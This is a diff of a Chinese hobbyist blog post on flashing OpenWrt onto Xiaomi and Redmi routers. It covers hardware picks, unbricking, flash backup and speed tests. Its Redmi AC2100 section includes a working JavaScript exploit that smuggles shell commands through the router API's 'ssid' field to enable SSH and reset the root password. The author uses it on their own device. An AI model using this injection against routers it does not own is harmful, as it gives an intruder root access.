@@ -20,23 +20,27 @@
     var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="刷机记录 第一次自己刷机红米AC21002022-02-13-记录红米AC2100折腾，一张精华图   路由器刷出问题，修复经验。知道了备份的重要性">
+  <meta name="description" content="Openwrt硬件选择如何选择一个可以刷openwrt的路由器？  老房子WiFi布网攻略 篇三十八：WiFi 6 梅林或openwrt固件路由器入手指南_路由器_什么值得买 (smzdm.com) 老房子WiFi布网攻略 篇二十四：不漏油的路由器不是好矿机，矿渣路由器盘点_路由器_什么值得买 (smzdm.com) 极路由、新路由：机皇！几种高性价比矿渣路由器比较-新手入门及其它(硬件)-恩山无">
 <meta property="og:type" content="article">
 <meta property="og:title" content="openwrt刷机">
 <meta property="og:url" content="http://yoursite.com/2022/02/13/openwrt%E5%88%B7%E6%9C%BA/index.html">
 <meta property="og:site_name" content="rain的随笔">
-<meta property="og:description" content="刷机记录 第一次自己刷机红米AC21002022-02-13-记录红米AC2100折腾，一张精华图   路由器刷出问题，修复经验。知道了备份的重要性">
+<meta property="og:description" content="Openwrt硬件选择如何选择一个可以刷openwrt的路由器？  老房子WiFi布网攻略 篇三十八：WiFi 6 梅林或openwrt固件路由器入手指南_路由器_什么值得买 (smzdm.com) 老房子WiFi布网攻略 篇二十四：不漏油的路由器不是好矿机，矿渣路由器盘点_路由器_什么值得买 (smzdm.com) 极路由、新路由：机皇！几种高性价比矿渣路由器比较-新手入门及其它(硬件)-恩山无">
 <meta property="og:locale" content="zh">
-<meta property="og:image" content="http://yoursite.com/images/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/image-20210622145337241.png">
-<meta property="og:image" content="http://yoursite.com/images/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/image-20211013203806985.png">
-<meta property="og:image" content="http://yoursite.com/images/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/image-20211013234425902.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/picgo/image-20221029213022447.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/picgo/image-20210622145337241.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/picgo/image-20221030210955796.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/picgo/image-20220802134158765.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/picgo/image-20220802134945115.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/picgo/image-20220802142756560.png">
 <meta property="article:published_time" content="2022-02-12T17:18:16.000Z">
-<meta property="article:modified_time" content="2022-05-24T08:48:12.629Z">
+<meta property="article:modified_time" content="2022-10-31T07:32:54.331Z">
 <meta property="article:author" content="rain">
 <meta property="article:tag" content="折腾">
 <meta property="article:tag" content="如何实现网络自由">
+<meta property="article:tag" content="openwrt">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yoursite.com/images/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/image-20210622145337241.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/picgo/image-20221029213022447.png">
 
 <link rel="canonical" href="http://yoursite.com/2022/02/13/openwrt%E5%88%B7%E6%9C%BA/">
 
@@ -126,7 +130,7 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags<span class="badge">9</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags<span class="badge">11</span></a>
 
   </li>
         <li class="menu-item menu-item-archives">
@@ -192,7 +196,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-05-24 16:48:12" itemprop="dateModified" datetime="2022-05-24T16:48:12+08:00">2022-05-24</time>
+                <time title="Modified: 2022-10-31 15:32:54" itemprop="dateModified" datetime="2022-10-31T15:32:54+08:00">2022-10-31</time>
               </span>
 
           
@@ -220,22 +224,222 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="刷机记录"><a href="#刷机记录" class="headerlink" title="刷机记录"></a>刷机记录</h2><ul>
-<li><p>第一次自己刷机红米AC2100<a href="/2022/02/13/%E8%AE%B0%E5%BD%95%E7%BA%A2%E7%B1%B3AC2100%E6%8A%98%E8%85%BE/" title="2022-02-13-记录红米AC2100折腾">2022-02-13-记录红米AC2100折腾</a>，一张精华图</p>
-<p><img src="/images/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/image-20210622145337241.png" alt="image-20210622145337241"></p>
-</li>
-<li><p>路由器刷出问题，修复经验。知道了备份的重要性</p>
-<a id="more"></a>
-
-</li>
-</ul>
-<h2 id="刷机方法总结"><a href="#刷机方法总结" class="headerlink" title="刷机方法总结"></a>刷机方法总结</h2><h3 id="Redmi-AC2100刷Openwrt"><a href="#Redmi-AC2100刷Openwrt" class="headerlink" title="Redmi AC2100刷Openwrt"></a>Redmi AC2100刷Openwrt</h3><h4 id="1-确认stock系统版本"><a href="#1-确认stock系统版本" class="headerlink" title="1. 确认stock系统版本"></a>1. 确认stock系统版本</h4><p>确认系统版本是否为2.0.23，如果不是，则在系统内手动升级到该版本<a href="http://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/rm2100/miwifi_rm2100_all_fb720_2.0.23.bin" target="_blank" rel="noopener">http://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/rm2100/miwifi_rm2100_all_fb720_2.0.23.bin</a></p>
-<h4 id="2-获得ssh"><a href="#2-获得ssh" class="headerlink" title="2. 获得ssh"></a>2. 获得ssh</h4><p>使用web漏洞，获得ssh</p>
+        <h2 id="Openwrt硬件选择"><a href="#Openwrt硬件选择" class="headerlink" title="Openwrt硬件选择"></a>Openwrt硬件选择</h2><p>如何选择一个可以刷openwrt的路由器？</p>
 <ul>
-<li>F12打开开发者工具</li>
-<li>在console控制台中粘贴以下代码</li>
-<li>回车即可</li>
+<li><a href="https://post.smzdm.com/p/awznd6qg/" target="_blank" rel="noopener">老房子WiFi布网攻略 篇三十八：WiFi 6 梅林或openwrt固件路由器入手指南_路由器_什么值得买 (smzdm.com)</a></li>
+<li><a href="https://post.smzdm.com/p/apzkqlrx/" target="_blank" rel="noopener">老房子WiFi布网攻略 篇二十四：不漏油的路由器不是好矿机，矿渣路由器盘点_路由器_什么值得买 (smzdm.com)</a></li>
+<li>极路由、新路由：<a href="https://www.right.com.cn/forum/thread-8097191-1-1.html" target="_blank" rel="noopener">机皇！几种高性价比矿渣路由器比较-新手入门及其它(硬件)-恩山无线论坛 (right.com.cn)</a><h3 id="小米路由器型号总结"><a href="#小米路由器型号总结" class="headerlink" title="小米路由器型号总结"></a>小米路由器型号总结</h3></li>
 </ul>
+<h4 id="CPU分类"><a href="#CPU分类" class="headerlink" title="CPU分类"></a>CPU分类</h4><ul>
+<li>mt7621型号<ul>
+<li>R3G：咸鱼50元左右，有USB3.0接口，128MB的flash。</li>
+<li>4A千兆版：咸鱼70元左右，外观简约漂亮，16MB NOR flash有点小。</li>
+<li>C660x：咸鱼100多，支持wifi6</li>
+</ul>
+</li>
+<li>高通型号<ul>
+<li><strong>目前(22.03)只有AX6S是受openwrt官方支持的</strong>，AX6, AX3600有第三方支持。AX5等其余未支持<ul>
+<li>不能刷好像是linux kernel还不支持高通的IPQ SoC。</li>
+<li>B站看到说AX5刷openwrt需要硬改内存为1G，好像说高通的wifi驱动非常耗内存</li>
+</ul>
+</li>
+<li>AX6S：220左右</li>
+<li>AX6：250-300左右</li>
+</ul>
+</li>
+</ul>
+<h4 id="小米系列产品"><a href="#小米系列产品" class="headerlink" title="小米系列产品"></a>小米系列产品</h4><ul>
+<li><p>红米AX5，小米AX1800换皮</p>
+<ul>
+<li>IPQ6000, 4核<a href="mailto:A53@1.2Ghz">A53@1.2Ghz</a>：<a href="https://openwrt.org/inbox/toh/xiaomi/xiaomi_ax1800" target="_blank" rel="noopener">[OpenWrt Wiki] Xiaomi AX1800 (AX5/RA67)</a></li>
+</ul>
+</li>
+<li><p><strong>红米AX6</strong>，小米AX3600换皮</p>
+<ul>
+<li>AX6, <strong>IPQ8071A</strong>@1.4GHz, 512(ram) + 128：<a href="https://openwrt.org/inbox/toh/xiaomi/xiaomi_redmi_ax6_ax3000" target="_blank" rel="noopener">[OpenWrt Wiki] Xiaomi Redmi AX6 Wi-Fi 6 Mesh Router</a></li>
+<li>AX3600, IPQ8071A, 512 + 256：<a href="https://openwrt.org/inbox/toh/xiaomi/xiaomi_ax3600" target="_blank" rel="noopener">[OpenWrt Wiki] Xiaomi AX3600</a></li>
+<li>对比：<a href="https://www.acwifi.net/11176.html" target="_blank" rel="noopener">红米AX6拆机，旧款WIFI6无线路由器-路由器交流 (acwifi.net)</a></li>
+</ul>
+</li>
+<li><p>AX3000</p>
+<ul>
+<li><strong>红米AX3000（比较常见）</strong>，IPQ5000：双核<a href="mailto:A53@1.0GHz">A53@1.0GHz</a>, 256(ram) + 128：<a href="https://www.mi.com/shop/buy/detail?product_id=14538" target="_blank" rel="noopener">Redmi路由器AX3000立即购买-小米商城</a></li>
+<li>小米AX3000：IPQ5000：双核<a href="mailto:A53@1.0GHz">A53@1.0GHz</a>, 256(ram) + 128：<a href="https://www.mi.com/shop/buy/detail?product_id=14790" target="_blank" rel="noopener">小米路由器AX3000立即购买-小米商城 (mi.com)</a></li>
+<li>红米AX3000模具和AX6S一样，为白色。小米AX3000为黑色四棱柱。</li>
+</ul>
+</li>
+<li><p>AX5400</p>
+<ul>
+<li>红米AX5400，IPQ5018：双核<a href="mailto:A53@1.0GHz">A53@1.0GHz</a>，512(ram) + 128：<a href="https://www.acwifi.net/19451.html" target="_blank" rel="noopener">红米AX5400千兆版拆机，看看与电竞版有什么差别-路由器交流 (acwifi.net)</a></li>
+</ul>
+</li>
+<li><p>AX6000</p>
+<ul>
+<li>小米AX6000<ul>
+<li>IPQ5018, 2核<a href="mailto:A53@1.0Ghz">A53@1.0Ghz</a>, 512(ram) + 128</li>
+<li>使用的SoC IPQ5018为高通沉浸式家庭联网平台，不如高通专业联网平台的IPQ8071A（AX3600上的）</li>
+</ul>
+</li>
+<li><strong>红米AX6000（很强）</strong><ul>
+<li><strong>MT7986A</strong>, 4核<a href="mailto:A53@2.0Ghz">A53@2.0Ghz</a>, 512(ram) + 128：<a href="https://openwrt.org/toh/xiaomi/redmi_ax6000" target="_blank" rel="noopener">[OpenWrt Wiki] Xiaomi Redmi AX6000</a></li>
+<li><a href="https://www.acwifi.net/19676.html" target="_blank" rel="noopener">红米AX6000拆机，最便宜的四核2.0GHz-路由器交流 (acwifi.net)</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/picgo/image-20221029213022447.png" alt="image-20221029213022447"></p>
+<p>参考</p>
+<ul>
+<li><p><a href="https://www.zhihu.com/question/474579126" target="_blank" rel="noopener">(33 封私信 / 71 条消息) 路由器红米ax3000和红米ax6选择哪个? - 知乎 (zhihu.com)</a></p>
+</li>
+<li><p>小米openwrt页面：<a href="https://openwrt.org/toh/hwdata/xiaomi/start" target="_blank" rel="noopener">[OpenWrt Wiki] Xiaomi</a></p>
+</li>
+<li><p>常见MediaTek SoC：<a href="https://wikidevi.wi-cat.ru/MediaTek" target="_blank" rel="noopener">MediaTek - WikiDevi.Wi-Cat.RU</a></p>
+</li>
+</ul>
+<h3 id="CPU对比"><a href="#CPU对比" class="headerlink" title="CPU对比"></a>CPU对比</h3><p>参考：</p>
+<ul>
+<li><p><a href="https://www.right.com.cn/forum/thread-216888-1-1.html" target="_blank" rel="noopener">[转贴] 无线路由器CPU浅析 MT7621A、 BCM47189 到底谁强？-新手入门及其它(硬件)-恩山无线论坛 (right.com.cn)</a></p>
+</li>
+<li><p>树莓派系列处理器：<a href="https://www.raspberrypi.com/documentation/computers/processors.html" target="_blank" rel="noopener">Raspberry Pi Documentation - Processors</a></p>
+<ul>
+<li>Raspberry Pi 2 Model B： BCM2836(quad-core Cortex-A7 )</li>
+<li>Raspberry Pi 3 Model B：BCM2837( quad-core <a href="mailto:Cortex-A53@1.2">Cortex-A53@1.2</a>)<ul>
+<li>50% faster than the Raspberry Pi 2.</li>
+</ul>
+</li>
+<li>Raspberry Pi 3 Models A+, B+: BCM2837B0(quad-core <a href="mailto:Cortex-A53@1.4">Cortex-A53@1.4</a>)<ul>
+<li>17% faster than the original Raspberry Pi 3</li>
+</ul>
+</li>
+<li>Raspberry Pi 4 Model B: BCM2837(quad-core <a href="mailto:Cortex-A72@1.5">Cortex-A72@1.5</a> GHz)<ul>
+<li>50% faster than the Raspberry Pi 3B+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>ARM核对比：<a href="https://en.wikipedia.org/wiki/List_of_ARM_processors" target="_blank" rel="noopener">List of ARM processors - Wikipedia</a></p>
+<ul>
+<li>Cortex-A7: 1.9 DMIPS/MHz per core</li>
+<li>A53: 2.3 DMIPS/MHz</li>
+<li>A72: 6.3-7.3 DMIPS/MHz</li>
+</ul>
+</li>
+<li><p>MIPS核：<a href="https://www.mips.com/products/classic/" target="_blank" rel="noopener">MIPS Classic Processor Cores - Imagination Technologies</a></p>
+<ul>
+<li>1004K: 1.6 DMIPS/MHz</li>
+</ul>
+</li>
+<li><p>74k: 1.93 DMIPS/MHz：CSAC路由器：71</p>
+</li>
+<li><p><a href="https://github.com/sawaYch/newifi3-d2-firmware/blob/master/README.md" target="_blank" rel="noopener">newifi3-d2-firmware/README.md at master · sawaYch/newifi3-d2-firmware (github.com)</a></p>
+</li>
+</ul>
+<h2 id="刷机过程总结"><a href="#刷机过程总结" class="headerlink" title="刷机过程总结"></a>刷机过程总结</h2><p>以红米AC2100可能的刷机为例，涵盖了openwrt的各种情况：刷breed，恢复，临时镜像</p>
+<ul>
+<li><p><strong>建议直接使用官方openwrt镜像 + 官方安装方式。几次使用breed都遇到了问题，而小米官方恢复工具也挺好用的。</strong></p>
+</li>
+<li><p>第一次自己刷机红米AC2100[[记录红米AC2100折腾]]，一张精华图</p>
+<p><img src="https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/picgo/image-20210622145337241.png" alt="image-20210622145337241"></p>
+</li>
+<li><p>路由器刷出问题，修复经验。知道了备份的重要性[[记录记一次路由器刷出问题修复过程]]</p>
+</li>
+</ul>
+<h2 id="小米路由器救砖"><a href="#小米路由器救砖" class="headerlink" title="小米路由器救砖"></a>小米路由器救砖</h2><h3 id="有官方bootloader的情况"><a href="#有官方bootloader的情况" class="headerlink" title="有官方bootloader的情况"></a>有官方bootloader的情况</h3><p><strong>说明：</strong></p>
+<p>官方的引导程序使用的是uboot，位于flash的Bootloader分区，而官方固件则位于OS1分区（红米AC2100）。正常刷openwrt的过程中不会修改bootloader。只要还保留着官方bootloader，就可以通过官方修复工具恢复。</p>
+<p><strong>步骤：</strong></p>
+<ol>
+<li>下载<code>小米路由器修复工具</code>和官方镜像：<a href="https://www.xiaomi.cn/post/19184644" target="_blank" rel="noopener">【下载汇总】客户端/ROM下载 - 小米社区 (xiaomi.cn)</a></li>
+<li><strong>路由器通电</strong>，PC通过网线连接到路由器LAN口</li>
+<li>打开<code>MIWIFIRepairTool.x86.exe</code></li>
+<li>选择镜像</li>
+<li><strong>选择网卡</strong>（可以在网络中心中将其它网卡禁用）</li>
+<li>断开路由器电源，按住rst键（也有可能需要用针戳），然后接上电源，等待黄灯闪烁（两个灯，一个是有电源标志，一个有互联网标志，这里为电源灯那个）</li>
+<li>软件自动上传镜像</li>
+<li>保持耐心等待路由器黄灯变蓝（中间过程保持黄灯），<strong>亲测需要4分钟</strong></li>
+<li>断电后重新接上电源，路由器重启</li>
+</ol>
+<h3 id="刷了breed"><a href="#刷了breed" class="headerlink" title="刷了breed"></a>刷了breed</h3><p><strong>说明：</strong></p>
+<p>breed自身便是一个bootloader，刷完breed后会覆盖原本的bootloader。如果想复原，可通过breed的功能，重新刷回官方bootloader。<strong>强烈建议刷breed前，先备份原本的bootloader以及整个flash</strong>。如果没备份，这里是恩山上收集的<strong>小米官方bootloader下载</strong>：<a href="https://www.right.com.cn/forum/thread-4102208-1-1.html" target="_blank" rel="noopener">论坛收集的几个小米路由器官方bootloader - 恩山无线论坛</a></p>
+<p><strong>步骤：</strong></p>
+<ol>
+<li>通过breed刷回官方bootloader</li>
+<li>通过官方修复工具修复</li>
+</ol>
+<h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><h3 id="snapshot的说明"><a href="#snapshot的说明" class="headerlink" title="snapshot的说明"></a>snapshot的说明</h3><p>snapshot是开发版分支</p>
+<ul>
+<li>默认没有安装luci（没有网页界面）</li>
+<li>上游每天都会编译产生新的snapshot。对于kernel mod相关软件，不是同一次编译则无法安装。</li>
+<li><a href="https://openwrt.org/docs/guide-quick-start/developmentinstallation" target="_blank" rel="noopener">[OpenWrt Wiki] Installing OpenWrt development snapshots</a></li>
+</ul>
+<h3 id="命令行安装sysupgrade-bin"><a href="#命令行安装sysupgrade-bin" class="headerlink" title="命令行安装sysupgrade.bin"></a>命令行安装sysupgrade.bin</h3><ul>
+<li><a href="https://openwrt.org/docs/guide-user/installation/sysupgrade.cli" target="_blank" rel="noopener">[OpenWrt Wiki] Upgrading OpenWrt firmware using CLI</a></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sysupgrade -v &#x2F;tmp&#x2F;firmware_image.bin</span><br><span class="line"></span><br><span class="line">#If sysupgrade is not available.</span><br><span class="line"># Flash firmware</span><br><span class="line">mtd -r write &#x2F;tmp&#x2F;firmware_image.bin firmware</span><br></pre></td></tr></table></figure>
+
+<h3 id="备份恢复-CLI"><a href="#备份恢复-CLI" class="headerlink" title="备份恢复 CLI"></a>备份恢复 CLI</h3><ul>
+<li>官方：<a href="https://openwrt.org/docs/guide-user/troubleshooting/backup_restore" target="_blank" rel="noopener">[OpenWrt Wiki] Backup and restore</a></li>
+</ul>
+<p>自己实现了一个自动配置openwrt脚本</p>
+<ul>
+<li><a href="https://github.com/TheRainstorm/my-openwrt-config" target="_blank" rel="noopener">TheRainstorm/my-openwrt-config (github.com)</a></li>
+</ul>
+<h3 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h3><h4 id="iperf3"><a href="#iperf3" class="headerlink" title="iperf3"></a>iperf3</h4><table>
+<thead>
+<tr>
+<th>说明</th>
+<th>连接</th>
+<th>src</th>
+<th>dst</th>
+<th>speed(Mb/s)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ax6s LAN2LAN</td>
+<td>千兆USB网卡</td>
+<td>tianyi310</td>
+<td>ax6s</td>
+<td>941</td>
+</tr>
+<tr>
+<td>ax6s wifi</td>
+<td>wifi6 5Ghz@1201</td>
+<td>s3pro</td>
+<td>ax6s</td>
+<td>626</td>
+</tr>
+<tr>
+<td>r4a LAN2LAN</td>
+<td>2.5G网卡</td>
+<td>ryzen</td>
+<td>r4a</td>
+<td>470</td>
+</tr>
+<tr>
+<td>r4a-ax6s vpn2vpn</td>
+<td></td>
+<td>tianyi310</td>
+<td>ryzen</td>
+<td>118</td>
+</tr>
+<tr>
+<td>r4a to ax6s</td>
+<td></td>
+<td>r4a</td>
+<td>ax6s</td>
+<td>136</td>
+</tr>
+<tr>
+<td>ax6s to r4a</td>
+<td></td>
+<td>ax6s</td>
+<td>r4a</td>
+<td>149</td>
+</tr>
+</tbody></table>
+<h2 id="具体型号刷机过程"><a href="#具体型号刷机过程" class="headerlink" title="具体型号刷机过程"></a>具体型号刷机过程</h2><h3 id="Redmi-AC2100刷Openwrt"><a href="#Redmi-AC2100刷Openwrt" class="headerlink" title="Redmi AC2100刷Openwrt"></a>Redmi AC2100刷Openwrt</h3><h4 id="1-确认stock系统版本"><a href="#1-确认stock系统版本" class="headerlink" title="1. 确认stock系统版本"></a>1. 确认stock系统版本</h4><p>确认系统版本是否为2.0.23，如果不是，则在系统内手动升级到该版本<a href="http://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/rm2100/miwifi_rm2100_all_fb720_2.0.23.bin" target="_blank" rel="noopener">http://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/rm2100/miwifi_rm2100_all_fb720_2.0.23.bin</a></p>
+<h4 id="2-获得ssh"><a href="#2-获得ssh" class="headerlink" title="2. 获得ssh"></a>2. 获得ssh</h4><p>使用web漏洞，获得ssh</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Work for RedMi 2100 firmware 2.0.23</span></span><br><span class="line"><span class="comment">// http://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/rm2100/miwifi_rm2100_all_fb720_2.0.23.bin</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSTOK</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> match = location.href.match(<span class="regexp">/;stok=(.*?)\//</span>);</span><br><span class="line">    <span class="keyword">if</span> (!match) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> match[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params">stok, command</span>) </span>&#123;</span><br><span class="line">    command = <span class="built_in">encodeURIComponent</span>(command);</span><br><span class="line">    <span class="keyword">let</span> path = <span class="string">`/cgi-bin/luci/;stok=<span class="subst">$&#123;stok&#125;</span>/api/misystem/set_config_iotdev?bssid=SteelyWing&amp;user_id=SteelyWing&amp;ssid=-h%0A<span class="subst">$&#123;command&#125;</span>%0A`</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(path);</span><br><span class="line">    <span class="keyword">return</span> fetch(<span class="keyword">new</span> Request(location.origin + path));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enableSSH</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    stok = getSTOK();</span><br><span class="line">    <span class="keyword">if</span> (!stok) &#123;</span><br><span class="line">        <span class="built_in">console</span>.error(<span class="string">'stok not found in URL'</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`stok = "<span class="subst">$&#123;stok&#125;</span>"`</span>);</span><br><span class="line"></span><br><span class="line">    password = prompt(<span class="string">'Input new SSH password'</span>);</span><br><span class="line">    <span class="keyword">if</span> (!password) &#123;</span><br><span class="line">        <span class="built_in">console</span>.error(<span class="string">'You must input password'</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    execute(stok, </span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">nvram set ssh_en=1</span></span><br><span class="line"><span class="string">nvram commit</span></span><br><span class="line"><span class="string">sed -i 's/channel=.*/channel=\\"debug\\"/g' /etc/init.d/dropbear</span></span><br><span class="line"><span class="string">/etc/init.d/dropbear start</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">    )</span><br><span class="line">        .then(<span class="function">(<span class="params">response</span>) =&gt;</span> response.text())</span><br><span class="line">        .then(<span class="function">(<span class="params">text</span>) =&gt;</span> <span class="built_in">console</span>.log(text));</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'New SSH password: '</span> + password);</span><br><span class="line">    execute(stok, <span class="string">`echo -e "<span class="subst">$&#123;password&#125;</span>\\n<span class="subst">$&#123;password&#125;</span>" | passwd root`</span>)</span><br><span class="line">        .then(<span class="function">(<span class="params">response</span>) =&gt;</span> response.text())</span><br><span class="line">        .then(<span class="function">(<span class="params">text</span>) =&gt;</span> <span class="built_in">console</span>.log(text));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">enableSSH();</span><br></pre></td></tr></table></figure>
 
 <h4 id="3-下载openwrt镜像"><a href="#3-下载openwrt镜像" class="headerlink" title="3. 下载openwrt镜像"></a>3. 下载openwrt镜像</h4><p>从官方下载最新镜像，注意有四个文件</p>
@@ -256,8 +460,8 @@
 <p>通过cat /proc/mtd，知道对应关系</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@XiaoQiang:&#x2F;tmp# cat &#x2F;proc&#x2F;mtd</span><br><span class="line">dev:    size   erasesize  name</span><br><span class="line">mtd0: 07f80000 00020000 &quot;ALL&quot;</span><br><span class="line">mtd1: 00080000 00020000 &quot;Bootloader&quot;</span><br><span class="line">mtd2: 00040000 00020000 &quot;Config&quot;</span><br><span class="line">mtd3: 00040000 00020000 &quot;Bdata&quot;</span><br><span class="line">mtd4: 00040000 00020000 &quot;Factory&quot;</span><br><span class="line">mtd5: 00040000 00020000 &quot;crash&quot;</span><br><span class="line">mtd6: 00040000 00020000 &quot;crash_syslog&quot;</span><br><span class="line">mtd7: 00040000 00020000 &quot;cfg_bak&quot;</span><br><span class="line">mtd8: 00400000 00020000 &quot;kernel0&quot;</span><br><span class="line">mtd9: 00400000 00020000 &quot;kernel1&quot;</span><br><span class="line">mtd10: 01a00000 00020000 &quot;rootfs0&quot;</span><br><span class="line">mtd11: 01a00000 00020000 &quot;rootfs1&quot;</span><br><span class="line">mtd12: 02600000 00020000 &quot;overlay&quot;</span><br><span class="line">mtd13: 01b80000 00020000 &quot;obr&quot;</span><br><span class="line">mtd14: 00c1c000 0001f000 &quot;ubi_rootfs&quot;</span><br><span class="line">mtd15: 021e8000 0001f000 &quot;data&quot;</span><br></pre></td></tr></table></figure>
 
-<p>备份，其中Factory中存储了EEPROM的数据，包含MAC地址等信息，如果丢失，可能会导致WIFI异常等问题。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;dev&#x2F;mtd4 &gt; Factory.dump</span><br><span class="line"></span><br><span class="line">scp复制到本地</span><br></pre></td></tr></table></figure>
+<p>备份，其中Factory中存储了EEPROM的数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;dev&#x2F;mtd4 &gt; Factory.dump</span><br><span class="line">cat &#x2F;dev&#x2F;mtd3 &gt; Bdata.dump</span><br><span class="line"></span><br><span class="line">scp复制到本地</span><br></pre></td></tr></table></figure>
 
 <h4 id="5-设置环境变量"><a href="#5-设置环境变量" class="headerlink" title="5. 设置环境变量"></a>5. 设置环境变量</h4><p>设置环境变量（rm2100有双系统用于备份保护，需要设置先启动哪一个）</p>
